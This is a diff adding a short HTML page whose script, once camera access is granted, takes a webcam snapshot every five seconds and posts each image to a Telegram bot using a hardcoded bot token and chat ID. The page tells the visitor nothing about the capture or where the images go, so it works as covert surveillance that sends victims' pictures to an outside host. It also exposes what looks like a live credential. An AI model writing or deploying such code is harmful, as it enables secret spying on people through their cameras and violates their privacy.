@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access and Send to Telegram</title>
+</head>
+<body>
+    <h1>Camera Access</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <script>
+        const video = document.getElementById('video');
+
+        // Request access to the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Take snapshot every 5 seconds
+                setInterval(takeSnapshot, 5000);
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: ", err);
+            });
+
+        function takeSnapshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/jpeg');
+            sendToTelegram(imageData);
+        }
+
+        function sendToTelegram(imageData) {
+            const telegramBotToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
+            const chatId = '5125698617';
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error("Error sending photo to Telegram: ", data);
+                }
+            })
+            .catch(err => {
+                console.error("Error sending photo to Telegram: ", err);
+            });
+        }
+    </script>
+</body>
+</html>
